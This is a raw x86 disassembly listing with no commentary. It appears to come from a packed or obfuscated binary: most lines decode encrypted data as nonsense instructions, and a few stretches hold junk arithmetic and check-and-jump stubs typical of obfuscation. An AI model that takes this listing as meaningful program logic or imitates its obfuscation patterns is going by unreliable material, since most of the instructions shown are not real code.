  416ed7:	fisub  DWORD PTR ds:0xb2fc0481
  416edd:	pop    eax
  416ede:	mov    eax,ds:0xdd46e93a
  416ee3:	jg     0x416e74
  416ee5:	xor    BYTE PTR [ebx],dl
  416ee7:	sub    DWORD PTR [ebp+0x17],0xa6cee4a8
  416eee:	scas   al,BYTE PTR es:[edi]
  416eef:	pop    ds
  416ef0:	repz fs inc esp
  416ef3:	std    
  416ef4:	push   es
  416ef5:	and    DWORD PTR [eax+esi*2],edx
  416ef8:	mov    cl,0x75
  416efa:	xor    eax,0xe4bcdbb4
  416eff:	mov    dl,BYTE PTR [eax+0x273f410b]
  416f05:	lock mov eax,0x1d0b47ab
  416f0b:	xchg   ecx,eax
  416f0c:	ficomp WORD PTR [edx-0x53570606]
  416f12:	(bad)  
  416f13:	dec    edx
  416f14:	jecxz  0x416f13
  416f16:	ret    
  416f17:	and    ebp,ecx
  416f19:	push   0x79055b76
  416f1e:	xlat   BYTE PTR ds:[ebx]
  416f1f:	xchg   ebp,eax
  416f20:	adc    bl,BYTE PTR [ebx]
  416f22:	sub    ebp,DWORD PTR [edi]
  416f24:	in     eax,dx
  416f25:	add    cl,ch
  416f27:	xchg   DWORD PTR [ecx+0x1d],ebx
  416f2a:	push   ebp
  416f2b:	fstp   TBYTE PTR [ebx]
  416f2d:	cmp    bh,BYTE PTR [ebx-0x6a]
  416f30:	sti    
  416f31:	das    
  416f32:	popf   
  416f33:	jo     0x416f96
  416f35:	cld    
  416f36:	adc    bl,BYTE PTR [ebp+0x55835b8a]
  416f3c:	and    eax,0x13e5ba7a
  416f41:	add    BYTE PTR [eax+0x50],0x63
  416f45:	cdq    
  416f46:	fisubr DWORD PTR [ecx+0x1b]
  416f49:	or     ebp,DWORD PTR es:[ebx]
  416f4c:	cmp    DWORD PTR [edi+0x2447757f],edx
  416f52:	mov    ah,0x54
  416f54:	adc    eax,0x9b0c3e01
  416f59:	(bad)  
  416f5a:	cmc    
  416f5b:	jge    0x416fa1
  416f5d:	xor    bh,BYTE PTR [eax-0x43]
  416f60:	loope  0x416f63
  416f62:	and    BYTE PTR [ebp+0x34],ch
  416f65:	aad    0x1c
  416f67:	mov    esi,0x76d47e50
  416f6c:	jp     0x416fc2
  416f6e:	dec    esi
  416f6f:	mov    eax,ds:0x3624b13
  416f74:	stos   BYTE PTR es:[edi],al
  416f75:	mov    ds:0x98d0be69,al
  416f7a:	inc    ecx
  416f7b:	jg     0x416f53
  416f7d:	pop    edi
  416f7e:	or     BYTE PTR [ecx+0x4c2049f7],ah
  416f84:	mov    ebp,0xbeb73be4
  416f89:	lock outs dx,DWORD PTR ds:[esi]
  416f8b:	dec    edi
  416f8c:	jb     0x416f91
  416f8e:	imul   ebx,DWORD PTR [edi+0x7cb90eb0],0x8c1b3128
  416f98:	jo     0x417004
  416f9a:	mov    ds:0x1867b09a,al
  416f9f:	mov    eax,0x771566c8
  416fa4:	and    eax,0xa18ae3eb
  416fa9:	adc    eax,0xb494f2b7
  416fae:	imul   edx,DWORD PTR [eax+edi*1-0x2c417235],0xffffff8e
  416fb6:	adc    al,0x65
  416fb8:	out    dx,al
  416fb9:	mov    cl,0x1e
  416fbb:	sbb    al,BYTE PTR [ecx]
  416fbd:	out    dx,al
  416fbe:	cmp    esp,DWORD PTR [esi-0x6f]
  416fc1:	punpcklbw mm7,mm7
  416fc4:	out    dx,eax
  416fc5:	es shl edx,1
  416fc8:	push   esp
  416fc9:	inc    edx
  416fca:	xchg   esp,eax
  416fcb:	call   0xdae2:0xfbb683cf
  416fd2:	test   ecx,esp
  416fd4:	push   esi
  416fd5:	std    
  416fd6:	fidivr DWORD PTR [ebx]
  416fd8:	ret    
  416fd9:	dec    edi
  416fda:	dec    ebp
  416fdb:	mov    bh,0xac
  416fdd:	mov    bh,0x5b
  416fdf:	fcom   DWORD PTR [di]
  416fe2:	stos   DWORD PTR es:[edi],eax
  416fe3:	inc    esp
  416fe4:	jbe    0x416ff7
  416fe6:	sub    BYTE PTR [ecx-0x32128c9e],dl
  416fec:	lea    ebx,[ecx+0x56468b5a]
  416ff2:	mov    cl,0xe
  416ff4:	xlat   BYTE PTR ds:[ebx]
  416ff5:	or     DWORD PTR [ecx-0x11],ebx
  416ff8:	test   BYTE PTR [ebx],0xe1
  416ffb:	mov    BYTE PTR [ecx+ebp*1-0x74],al
  416fff:	add    DWORD PTR [ecx],ebx
  417001:	jne    0x417019
  417003:	aad    0xc1
  417005:	ret    0x8c3b
  417008:	jl     0x417083
  41700a:	repnz fnstcw WORD PTR [ebx-0x40]
  41700e:	jae    0x416fbb
  417010:	scas   eax,DWORD PTR es:[edi]
  417011:	les    ecx,FWORD PTR [eax]
  417013:	ret    
  417014:	mov    ds,WORD PTR [ecx-0xb]
  417017:	ret    0xa7f4
  41701a:	rol    BYTE PTR [esi],cl
  41701c:	and    ch,BYTE PTR [edx]
  41701e:	mov    bh,0xb9
  417020:	adc    DWORD PTR [ecx],ebx
  417022:	inc    ecx
  417023:	push   edi
  417024:	cwde   
  417025:	rcr    DWORD PTR [edi+eiz*4-0x1bfc96c5],1
  41702c:	fild   WORD PTR [eax]
  41702e:	sbb    al,0x4f
  417030:	nop
  417031:	xlat   BYTE PTR ds:[ebx]
  417032:	pusha  
  417033:	out    dx,al
  417034:	iret   
  417035:	adc    BYTE PTR [edi+0x54c7075e],bh
  41703b:	inc    ecx
  41703c:	ja     0x416fd8
  41703e:	lock ss push ecx
  417041:	dec    esi
  417042:	sar    eax,cl
  417044:	scas   eax,DWORD PTR es:[edi]
  417045:	xor    DWORD PTR [ebp+0x66],0xfffffff9
  417049:	adc    DWORD PTR es:[edi-0x68ab2048],0x44
  417051:	pop    esi
  417052:	sti    
  417053:	(bad)  
  417054:	or     bh,al
  417056:	repnz in al,0x7f
  417059:	fisubr DWORD PTR [edx+0x2b]
  41705c:	mov    bh,0x96
  41705e:	stos   BYTE PTR es:[edi],al
  41705f:	cwde   
  417060:	xchg   esi,eax
  417061:	iret   
  417062:	aaa    
  417063:	mov    dh,0xd8
  417065:	and    BYTE PTR [ecx],0x7f
  417068:	daa    
  417069:	inc    eax
  41706a:	hlt    
  41706b:	add    DWORD PTR [edi+0x28986ab8],edx
  417071:	leave  
  417072:	arpl   WORD PTR [ecx],di
  417074:	call   DWORD PTR [ebx+edi*2]
  417077:	sahf   
  417078:	add    BYTE PTR [esi+esi*1-0x159f574b],bh
  41707f:	jl     0x417016
  417081:	outs   dx,BYTE PTR ds:[esi]
  417082:	mov    al,ds:0x4867c5c4
  417087:	inc    ebp
  417088:	and    ebx,edi
  41708a:	mov    esp,0x43695165
  41708f:	or     al,0x1f
  417091:	scas   eax,DWORD PTR es:[edi]
  417092:	imul   ecx,DWORD PTR [edx+0x70],0x51336cc3
  417099:	icebp  
  41709a:	push   ds
  41709b:	add    BYTE PTR [ecx],0xf0
  41709e:	(bad)  
  41709f:	sar    BYTE PTR [ecx+0x40bed906],1
  4170a5:	pop    esi
  4170a6:	inc    ebp
  4170a7:	ins    DWORD PTR es:[edi],dx
  4170a8:	jne    0x4170f1
  4170aa:	ins    DWORD PTR es:[edi],dx
  4170ab:	mov    edi,0xfc6b68ed
  4170b0:	and    dh,BYTE PTR [eax]
  4170b2:	pop    ds
  4170b3:	frstor [ecx]
  4170b5:	aas    
  4170b6:	nop
  4170b7:	icebp  
  4170b8:	retf   
  4170b9:	clc    
  4170ba:	rol    dh,0x3
  4170bd:	jmp    0xcba43c9d
  4170c2:	lea    esp,fs:[ebx+0x50]
  4170c6:	cmp    ebx,DWORD PTR [eax]
  4170c8:	mov    ss,ebx
  4170ca:	mov    eax,ds:0xe0480ae1
  4170cf:	ret    0x4ca9
  4170d2:	lods   eax,DWORD PTR ds:[esi]
  4170d3:	cmp    DWORD PTR [edx-0x13d878a9],0x6f
  4170da:	adc    DWORD PTR [eax],0xffffffa9
  4170dd:	int3   
  4170de:	enter  0xc258,0xa
  4170e2:	push   0x47e1b377
  4170e7:	dec    eax
  4170e8:	xchg   esp,eax
  4170e9:	mov    esi,0xfddb5485
  4170ee:	push   ebx
  4170ef:	enter  0xaa19,0x2f
  4170f3:	sbb    eax,0xc6306ef6
  4170f8:	lahf   
  4170f9:	inc    ecx
  4170fa:	in     eax,0xbf
  4170fc:	dec    esi
  4170fd:	enter  0x6a11,0x28
  417101:	stos   BYTE PTR es:[edi],al
  417102:	lods   al,BYTE PTR ds:[esi]
  417103:	adc    dh,BYTE PTR [eax]
  417105:	imul   edi,ebp,0xba7af962
  41710b:	push   esp
  41710c:	icebp  
  41710d:	mov    cl,BYTE PTR [ebp+0x2a]
  417110:	popa   
  417111:	dec    edi
  417112:	pop    DWORD PTR [ebp+0x3b]
  417115:	ret    
  417116:	sbb    ebp,DWORD PTR ds:0x307dc44f
  41711c:	test   eax,0x1895f337
  417121:	dec    esi
  417122:	out    0x61,al
  417124:	stos   DWORD PTR es:[edi],eax
  417125:	mov    ds:0xc8bc22ad,eax
  41712a:	xor    dl,BYTE PTR [eax+eiz*8+0x1311d172]
  417131:	out    dx,al
  417132:	popa   
  417133:	xlat   BYTE PTR ds:[ebx]
  417134:	pop    ss
  417135:	adc    BYTE PTR [ecx-0x4a048dff],dh
  41713b:	aam    0x23
  41713d:	ret    
  41713e:	aaa    
  41713f:	test   BYTE PTR [edx-0x3a5c0ca6],bl
  417145:	fwait
  417146:	adc    al,0xaa
  417148:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417149:	cmc    
  41714a:	cmp    al,ah
  41714c:	and    BYTE PTR [edi+0x45c27e86],ah
  417152:	mov    eax,0xaa96f986
  417157:	ret    
  417158:	test   BYTE PTR [ecx+0x4d],ah
  41715b:	pushf  
  41715c:	mov    ds:0x592acf24,eax
  417161:	xchg   BYTE PTR [eax-0x33317ad9],bl
  417167:	cmp    cl,BYTE PTR [eax+0x6ef4959]
  41716d:	xchg   edx,eax
  41716e:	popf   
  41716f:	rol    ecx,0x2
  417172:	mov    eax,0xa6069cae
  417177:	xor    ecx,eax
  417179:	cmp    ecx,eax
  41717b:	je     0x4180dd
  417181:	jmp    0x41750b
  417186:	xor    eax,DWORD PTR [edi+0x0]
  417189:	stos   BYTE PTR es:[edi],al
  41718a:	mov    ah,0xbd
  41718c:	mov    ecx,0xf5129047
  417191:	cmp    esp,esi
  417193:	inc    ecx
  417194:	mov    eax,ds:0xc1f0d4fb
  417199:	mov    ebx,0xbbbbc590
  41719e:	mov    ds:0xa80841f7,eax
  4171a3:	dec    ebp
  4171a4:	xchg   cl,ah
  4171a6:	sub    al,al
  4171a8:	jae    0x417185
  4171aa:	aas    
  4171ab:	ret    0x46ce
  4171ae:	pop    ecx
  4171af:	jns    0x4171ee
  4171b1:	leave  
  4171b2:	lea    ecx,[ebx]
  4171b4:	fwait
  4171b5:	push   ss
  4171b6:	add    al,0x7f
  4171b8:	(bad)  
  4171b9:	pop    edx
  4171ba:	test   BYTE PTR [ecx-0x465c4f35],bh
  4171c0:	cdq    
  4171c1:	and    dl,al
  4171c3:	scas   eax,DWORD PTR es:[edi]
  4171c4:	jg     0x41723a
  4171c6:	pop    eax
  4171c7:	rol    DWORD PTR [edx+0x6698ec67],cl
  4171cd:	mov    ecx,0xa124a1df
  4171d2:	dec    ebx
  4171d3:	sbb    BYTE PTR [eax+ecx*1],0xb7
  4171d7:	test   al,0xea
  4171d9:	in     al,dx
  4171da:	sbb    DWORD PTR [ebp-0x2fbce147],ebx
  4171e0:	mov    edx,DWORD PTR [ebx+0x59]
  4171e3:	loop   0x417173
  4171e5:	or     cl,BYTE PTR [esi+0x6abb6497]
  4171eb:	js     0x417188
  4171ed:	mov    bl,0x18
  4171ef:	pop    eax
  4171f0:	fsubp  st(7),st
  4171f2:	xlat   BYTE PTR ds:[ebx]
  4171f3:	test   BYTE PTR [ebp+edx*2+0x54ca283f],ch
  4171fa:	push   ecx
  4171fb:	jae    0x4171bc
  4171fd:	js     0x417187
  4171ff:	call   0x641e:0xd2693951
  417206:	in     al,dx
  417207:	aaa    
  417208:	jl     0x417258
  41720a:	mov    eax,ds:0xee9a4674
  41720f:	push   es
  417210:	ficomp DWORD PTR [edx+eiz*1-0x4b45f60c]
  417217:	js     0x417268
  417219:	add    cl,cl
  41721b:	sub    al,0xe
  41721d:	xor    BYTE PTR [ecx+0x7278d5c],0xef
  417224:	les    ebp,FWORD PTR [edx-0x51921f8e]
  41722a:	and    ah,BYTE PTR [eax+0x33c99940]
  417230:	jl     0x417290
  417232:	mov    dh,0x67
  417234:	and    eax,0xd90cb122
  417239:	pop    edi
  41723a:	idiv   DWORD PTR [ebp+0x62f9e841]
  417240:	cli    
  417241:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417242:	or     eax,edi
  417244:	es popf 
  417246:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417247:	aas    
  417248:	dec    edi
  417249:	fwait
  41724a:	lea    ecx,[ebx-0x5c28311f]
  417250:	add    dl,dl
  417252:	hlt    
  417253:	jne    0x41727e
  417255:	or     edi,DWORD PTR [eax+0x22f2802]
  41725b:	push   edi
  41725c:	out    0x3e,al
  41725e:	inc    ebx
  41725f:	pop    edi
  417260:	sbb    ebx,DWORD PTR [edx+ecx*1+0x78c29579]
  417267:	xchg   ecx,eax
  417268:	lods   al,BYTE PTR ds:[esi]
  417269:	and    al,0xb2
  41726b:	int    0x24
  41726d:	test   BYTE PTR [esi+0x3e3a3d79],ch
  417273:	adc    eax,DWORD PTR [esi-0x4c95c215]
  417279:	in     al,0xd1
  41727b:	imul   ebp,DWORD PTR gs:[ebx],0x4f
  41727f:	mov    bh,0xae
  417281:	adc    DWORD PTR [ecx],0x68
  417284:	hlt    
  417285:	mov    dh,0xb
  417287:	fbstp  TBYTE PTR [esi]
  417289:	les    eax,FWORD PTR [esi+0x1a]
  41728c:	mov    eax,0x64f609b
  417291:	mov    dh,BYTE PTR [ebp-0x35579516]
  417297:	jno    0x41727f
  417299:	cdq    
  41729a:	jg     0x417288
  41729c:	adc    edx,ebp
  41729e:	or     al,0xf
  4172a0:	fld    TBYTE PTR [esi-0x30]
  4172a3:	xchg   ecx,eax
  4172a4:	mov    edi,DWORD PTR [esi]
  4172a6:	push   0xdcbee724
  4172ab:	add    ah,BYTE PTR [esi+0x7d]
  4172ae:	ins    BYTE PTR es:[edi],dx
  4172af:	mov    esi,0x49141079
  4172b4:	jg     0x417304
  4172b6:	test   al,0xe
  4172b8:	scas   al,BYTE PTR es:[edi]
  4172b9:	gs out 0xa9,eax
  4172bc:	mov    bl,0xce
  4172be:	(bad)  [eax-0x59203eac]
  4172c4:	std    
  4172c5:	mov    al,ds:0xc4fbbb53
  4172ca:	dec    edx
  4172cb:	mov    ds:0x593cb1d0,al
  4172d0:	push   ebp
  4172d1:	push   cs
  4172d2:	mov    ds:0x1fe723a2,eax
  4172d7:	data16 ror BYTE PTR [esi-0x34984bc7],cl
  4172de:	xor    DWORD PTR [edx+0x3158ae7c],esp
  4172e4:	xlat   BYTE PTR ds:[ebx]
  4172e5:	dec    ecx
  4172e6:	test   bh,0xb7
  4172e9:	test   DWORD PTR [edi-0x72],0xc1d02191
  4172f0:	enter  0x35c,0xbd
  4172f4:	jnp    0x417336
  4172f6:	add    DWORD PTR [ebx+0xa],esi
  4172f9:	(bad)  
  4172fa:	mov    ebx,0x9d539812
  4172ff:	cmp    ebx,esp
  417301:	xchg   BYTE PTR [ebp+0x3e4319c7],ah
  417307:	mov    ebx,0x47e86d3e
  41730c:	or     esp,edx
  41730e:	enter  0xe097,0xf4
  417312:	or     ebp,ebx
  417314:	xchg   DWORD PTR [esi],esi
  417316:	inc    esi
  417317:	mov    ebx,DWORD PTR [ebx+0x1d]
  41731a:	(bad)  
  41731b:	mov    bh,0x86
  41731d:	fild   WORD PTR [ebx]
  41731f:	xchg   ch,dl
  417321:	or     al,0x77
  417323:	push   ss
  417324:	cli    
  417325:	xor    al,0x3a
  417327:	arpl   WORD PTR [eax+0x22],ax
  41732a:	inc    ebp
  41732b:	fwait
  41732c:	sbb    DWORD PTR [edi],esp
  41732e:	and    BYTE PTR [ebp-0x43],0x7b
  417332:	leave  
  417333:	call   0xbbc6:0x42a3eef1
  41733a:	jmp    0xf77bbdde
  41733f:	adc    ecx,DWORD PTR [eax]
  417341:	arpl   si,bx
  417343:	mov    dl,0xeb
  417345:	call   0x2d81:0xe027a20e
  41734c:	fs pop ds
  41734e:	in     al,0x9
  417350:	dec    edx
  417351:	(bad)  
  417352:	cli    
  417353:	xlat   BYTE PTR ds:[ebx]
  417354:	sub    DWORD PTR [esi-0x14],ebx
  417357:	jbe    0x41739c
  417359:	mov    ebp,0x9a84aa59
  41735e:	mov    DWORD PTR [edx],ebp
  417360:	mov    ebx,0x26e8f238
  417365:	outs   dx,BYTE PTR ds:[esi]
  417366:	call   0x372d:0x4d63f053
  41736d:	push   es
  41736e:	mov    ebp,0x17cabab9
  417373:	mov    ebp,0x6e87cdd3
  417378:	mov    al,ds:0x4121a1a5
  41737d:	bound  edx,QWORD PTR [ebx-0x37b965bf]
  417383:	inc    ecx
  417384:	outs   dx,BYTE PTR ds:[esi]
  417385:	loopne 0x4173e7
  417387:	cmp    esp,ebp
  417389:	push   ebx
  41738a:	push   0x21
  41738c:	dec    ecx
  41738d:	js     0x4173ed
  41738f:	sub    al,BYTE PTR [esi+0x36]
  417392:	pop    esi
  417393:	jmp    0xc5a928ce
  417398:	adc    BYTE PTR [esi],ah
  41739a:	sub    BYTE PTR [esi],0xd6
  41739d:	pop    ss
  41739e:	push   ebp
  41739f:	adc    dl,dl
  4173a1:	sbb    eax,0x5f222e75
  4173a6:	fs out dx,eax
  4173a8:	adc    DWORD PTR [eax+0x4a],0xbf9c95a5
  4173af:	outs   dx,DWORD PTR ds:[esi]
  4173b0:	pop    ebx
  4173b1:	and    DWORD PTR [ebx],esi
  4173b3:	cwde   
  4173b4:	jmp    0x7da2:0xc6b34323
  4173bb:	add    DWORD PTR [edi+0x3d],ebp
  4173be:	add    edx,DWORD PTR [ecx+0x8]
  4173c1:	cmp    bh,dh
  4173c3:	dec    esp
  4173c4:	nop
  4173c5:	pop    edx
  4173c6:	aam    0xd2
  4173c8:	lods   al,BYTE PTR ds:[esi]
  4173c9:	jno    0x417365
  4173cb:	pop    ss
  4173cc:	adc    eax,0x7faebd4e
  4173d1:	inc    eax
  4173d2:	add    al,0x2c
  4173d4:	sar    esp,cl
  4173d6:	push   ss
  4173d7:	(bad)  
  4173d8:	fnstenv [bp+di-0x20]
  4173dc:	dec    edi
  4173dd:	out    dx,al
  4173de:	mov    eax,ds:0xcf498326
  4173e3:	and    eax,0x45927f6d
  4173e8:	ret    
  4173e9:	retf   0x23c
  4173ec:	(bad)  
  4173ed:	or     BYTE PTR ss:[ebx-0x2429e15b],ch
  4173f4:	mov    eax,ds:0xcb7a0628
  4173f9:	lock loope 0x4173ea
  4173fc:	mov    dl,0x5a
  4173fe:	jb     0x4173cb
  417400:	xchg   esp,eax
  417401:	imul   edi,DWORD PTR [eax],0xf98b6360
  417407:	aam    0x4
  417409:	jle    0x417416
  41740b:	lods   al,BYTE PTR ds:[esi]
  41740c:	xor    BYTE PTR [edi+0x4f3f442e],0x65
  417413:	fscale 
  417415:	jnp    0x417490
  417417:	test   eax,ecx
  417419:	cmp    dl,al
  41741b:	adc    DWORD PTR [edi+0x74],ebp
  41741e:	jb     0x4173f2
  417420:	jae    0x41740d
  417422:	or     al,0x5e
  417424:	loop   0x417470
  417426:	mov    bl,BYTE PTR [ebp+0x55]
  417429:	dec    ebp
  41742a:	mov    DWORD PTR [eax+0xd],ebx
  41742d:	jo     0x41746f
  41742f:	mov    edx,0x6c10b3f6
  417434:	ficomp DWORD PTR [esi+0x3f]
  417437:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417438:	mov    edx,0x4c1ea12c
  41743d:	sub    eax,0x8c65691b
  417442:	jb     0x41741d
  417444:	jbe    0x4173e7
  417446:	test   DWORD PTR [ecx],ebx
  417448:	jae    0x41749d
  41744a:	loope  0x41745a
  41744c:	pop    eax
  41744d:	pop    ds
  41744e:	xor    DWORD PTR [si+0x21ba],ecx
  417453:	(bad)  
  417455:	ror    BYTE PTR [esi],1
  417457:	into   
  417458:	sbb    BYTE PTR [ecx-0x35],ch
  41745b:	iret   
  41745c:	jg     0x4174d5
  41745e:	data16 jle 0x41746d
  417461:	mov    eax,0x177b5032
  417466:	xor    DWORD PTR [eax+eax*8-0x58561128],ebp
  41746d:	pop    esi
  41746e:	push   edi
  41746f:	xor    cl,bl
  417471:	jo     0x417436
  417473:	adc    ebx,ebp
  417475:	dec    ebp
  417476:	popa   
  417477:	or     ah,dh
  417479:	mov    DWORD PTR [ecx],ebx
  41747b:	inc    esp
  41747c:	pop    edx
  41747d:	adc    DWORD PTR [edx],edx
  41747f:	scas   eax,DWORD PTR es:[edi]
  417480:	in     al,dx
  417481:	loope  0x417501
  417483:	push   cs
  417484:	xchg   edx,eax
  417485:	es fcmovb st,st(4)
  417488:	push   es
  417489:	add    eax,0x88de6a86
  41748e:	clc    
  41748f:	push   0x51
  417491:	cwde   
  417492:	(bad)  [ecx]
  417494:	fwait
  417495:	aad    0xa5
  417497:	imul   edi,DWORD PTR [edx],0x3a
  41749a:	std    
  41749b:	mov    al,ds:0x3aca230f
  4174a0:	xor    DWORD PTR [esi-0x444ae584],esp
  4174a6:	mov    dh,0x49
  4174a8:	xchg   ecx,eax
  4174a9:	rol    ah,0xf7
  4174ac:	cmp    BYTE PTR [edi+0x7fa17bf1],al
  4174b2:	(bad)  
  4174b3:	loop   0x41743c
  4174b5:	sub    ebp,DWORD PTR ds:0x3913b0cc
  4174bb:	dec    ecx
  4174bc:	loope  0x4174e7
  4174be:	lea    esp,[esp+ebp*2+0x74ea1e9]
  4174c5:	shr    BYTE PTR [ebp+0x2c],cl
  4174c8:	add    edx,DWORD PTR [edi+0x66930e37]
  4174ce:	add    al,0xcb
  4174d0:	sub    ebx,DWORD PTR [edi-0x39]
  4174d3:	fldcw  WORD PTR [ebx-0x6f72238e]
  4174d9:	or     BYTE PTR [ebx+0xce3f2bb],bl
  4174df:	fucomp st(2)
  4174e1:	mov    esi,0xefd1e7ae
  4174e6:	inc    esp
  4174e7:	pop    ebx
  4174e8:	sub    eax,0x69c75b49
  4174ed:	sub    BYTE PTR [edi],0xdd
  4174f0:	and    bh,ah
  4174f2:	aad    0x82
  4174f4:	cld    
  4174f5:	xlat   BYTE PTR ds:[ebx]
  4174f6:	mov    bh,al
  4174f8:	xchg   esp,eax
  4174f9:	into   
  4174fa:	popa   
  4174fb:	pop    ebp
  4174fc:	(bad)  
  4174fd:	and    BYTE PTR [ecx],bl
  4174ff:	inc    esi
  417500:	loope  0x4174bf
  417502:	add    edx,DWORD PTR [ebp+0x28]
  417505:	fcomi  st,st(1)
  417507:	sahf   
  417508:	out    0x33,al
  41750a:	(bad)  
  41750b:	mov    DWORD PTR [ebp-0x18],0x1001
  417512:	mov    edx,DWORD PTR [ebp-0x1c]
  417515:	xor    ecx,ecx
  417517:	test   edx,edx
  417519:	je     0x417cb1
  41751f:	mov    al,BYTE PTR [ecx+edi*1]
  417522:	mov    BYTE PTR [ebp-0x1],al
  417525:	mov    BYTE PTR [ebp-0x3],0x74
  417529:	mov    BYTE PTR [ebp-0x2],0x16
  41752d:	mov    BYTE PTR [ebp-0x4],0x62
  417531:	movzx  eax,BYTE PTR [ebp-0x4]
  417535:	movzx  ebx,BYTE PTR [ebp-0x2]
  417539:	or     eax,0xd4
  41753e:	and    eax,ebx
  417540:	movzx  ebx,BYTE PTR [ebp-0x3]
  417544:	and    eax,ebx
  417546:	mov    BYTE PTR [ebp-0x12],al
  417549:	mov    BYTE PTR [ebp-0x11],0xfe
  41754d:	mov    BYTE PTR [ebp-0x14],0x32
  417551:	mov    BYTE PTR [ebp-0x4],0xc7
  417555:	mov    BYTE PTR [ebp-0x2],0x73
  417559:	mov    BYTE PTR [ebp-0x3],0xb3
  41755d:	mov    al,BYTE PTR [ebp-0x3]
  417560:	mov    bl,BYTE PTR [ebp-0x2]
  417563:	or     al,bl
  417565:	mov    bl,BYTE PTR [ebp-0x4]
  417568:	sub    al,bl
  41756a:	mov    bl,BYTE PTR [ebp-0x14]
  41756d:	imul   bl
  41756f:	mov    bl,BYTE PTR [ebp-0x11]
  417572:	sub    al,bl
  417574:	mov    bl,BYTE PTR [ebp-0x12]
  417577:	cmp    bl,al
  417579:	jmp    0x417903
  41757e:	fwait
  41757f:	adc    edx,DWORD PTR [esi]
  417581:	xchg   ebx,eax
  417582:	mov    dh,0x97
  417584:	lahf   
  417585:	xor    edi,DWORD PTR [ecx-0x15]
  417588:	adc    DWORD PTR [ecx],esi
  41758a:	push   0xa371fbfe
  41758f:	repnz sar DWORD PTR [ebx-0x44443a70],0xb1
  417597:	loope  0x41755f
  417599:	cmp    edx,DWORD PTR [edx+0x13a15124]
  41759f:	lods   eax,DWORD PTR ds:[esi]
  4175a0:	popf   
  4175a1:	mov    bh,0x43
  4175a3:	add    ebp,DWORD PTR [ecx-0x6e65e98e]
  4175a9:	jmp    0x41757b
  4175ab:	(bad)  
  4175ac:	mov    ebx,?
  4175ae:	icebp  
  4175af:	test   DWORD PTR [edi+edx*4],ebx
  4175b2:	fmul   DWORD PTR [ecx+ebp*4]
  4175b5:	push   esi
  4175b6:	xor    eax,0x3088e4cb
  4175bb:	jp     0x4175af
  4175bd:	adc    ah,dl
  4175bf:	mov    ebx,0x494bf10e
  4175c4:	adc    ecx,DWORD PTR [bp+0x62]
  4175c8:	sub    DWORD PTR [ebx+0x272b0cc8],ebp
  4175ce:	xchg   al,bh
  4175d0:	std    
  4175d1:	mov    ds:0x8003d79b,eax
  4175d6:	or     ebx,0xaca73178
  4175dc:	mov    esi,0xe2a4b8a4
  4175e1:	sti    
  4175e2:	(bad)  [eax+edx*2+0x723cb667]
  4175e9:	mov    dl,BYTE PTR [ecx+edi*4-0x2a3eba6b]
  4175f0:	data16 mov ah,0xe
  4175f3:	cmp    esi,0x3ebcbf05
  4175f9:	xchg   edx,eax
  4175fa:	sbb    al,ch
  4175fc:	mov    ebp,0xd8b10ae9
  417601:	push   edi
  417602:	div    DWORD PTR [ebx+0x7f8a2784]
  417608:	aaa    
  417609:	loop   0x41766b
  41760b:	sbb    al,BYTE PTR [ecx+0x47]
  41760e:	sbb    DWORD PTR [edi+0x60a72b72],0x7ab62a61
  417618:	xchg   ecx,eax
  417619:	mov    al,ds:0xe28af68d
  41761e:	lock jp 0x4175a7
  417621:	push   edi
  417622:	mov    edx,0x250b6b97
  417627:	dec    edx
  417628:	pop    eax
  417629:	mov    ah,0x16
  41762b:	xchg   edx,eax
  41762c:	mov    ebx,0x61db3849
  417631:	inc    ecx
  417632:	ss hlt 
  417634:	ins    BYTE PTR es:[edi],dx
  417635:	push   0x34
  417637:	mov    ebx,0x5e8bd4b1
  41763c:	xchg   DWORD PTR [ebp+0x23],edi
  41763f:	or     ecx,eax
  417641:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417642:	inc    esp
  417643:	mov    ds:0xb26a2597,eax
  417648:	dec    eax
  417649:	int    0x5e
  41764b:	lods   al,BYTE PTR ds:[esi]
  41764c:	test   BYTE PTR [ebp-0x3a9aebde],dh
  417652:	lock jle 0x417698
  417655:	jle    0x417623
  417657:	mov    ebx,0x657b4309
  41765c:	sbb    DWORD PTR [edi-0x724ab33e],esi
  417662:	pop    ebx
  417663:	(bad)  
  417664:	aad    0xbb
  417666:	jle    0x4176d1
  417668:	push   esp
  417669:	dec    edx
  41766a:	pushf  
  41766b:	adc    dl,ch
  41766d:	(bad)  
  41766e:	imul   BYTE PTR [ebp-0x77f6ae4b]
  417674:	sub    edi,ecx
  417676:	sub    eax,DWORD PTR [eax+ebx*8-0xb]
  41767a:	adc    esi,DWORD PTR [eax-0x40e744ce]
  417680:	scas   eax,DWORD PTR es:[edi]
  417681:	cdq    
  417682:	repz xor eax,0xcbc8a2e0
  417688:	in     al,dx
  417689:	inc    eax
  41768a:	mov    ebx,0x138428bd
  41768f:	dec    esp
  417690:	ficom  DWORD PTR [ebx+ecx*1-0x20c04cff]
  417697:	nop
  417698:	xor    cl,BYTE PTR [edi]
  41769a:	push   ebp
  41769b:	inc    edx
  41769c:	popf   
  41769d:	inc    ebp
  41769e:	scas   al,BYTE PTR es:[edi]
  41769f:	sbb    al,0x7f
  4176a1:	xchg   ecx,eax
  4176a2:	mov    ah,0x84
  4176a4:	fisub  WORD PTR [esi]
  4176a6:	dec    edx
  4176a8:	shl    DWORD PTR [esi],cl
  4176aa:	xor    ch,al
  4176ac:	and    ebp,ebx
  4176ae:	fmul   QWORD PTR [ebx]
  4176b0:	xor    DWORD PTR [esi],esp
  4176b2:	mov    edi,0x2be4f7e5
  4176b7:	mov    dl,0x5f
  4176b9:	cmp    al,BYTE PTR [edx]
  4176bb:	inc    edx
  4176bc:	(bad)  
  4176bd:	aad    0xc0
  4176bf:	sub    al,BYTE PTR [esi]
  4176c1:	inc    esi
  4176c2:	sar    DWORD PTR [eax+0x74],1
  4176c5:	hlt    
  4176c6:	js     0x4176bf
  4176c8:	lock mov WORD PTR [edi],cs
  4176cb:	xchg   esp,eax
  4176cc:	cmp    eax,0xdb937681
  4176d1:	test   BYTE PTR [edi-0x71c49981],bh
  4176d7:	mov    bh,0xca
  4176d9:	dec    edi
  4176da:	or     eax,0x5f7d9517
  4176df:	sub    edi,DWORD PTR [ebx+0x41]
  4176e2:	repnz dec edi
  4176e4:	call   0x5099:0x29cfe2c
  4176eb:	inc    ebx
  4176ec:	add    al,0xbb
  4176ee:	mov    dl,0x11
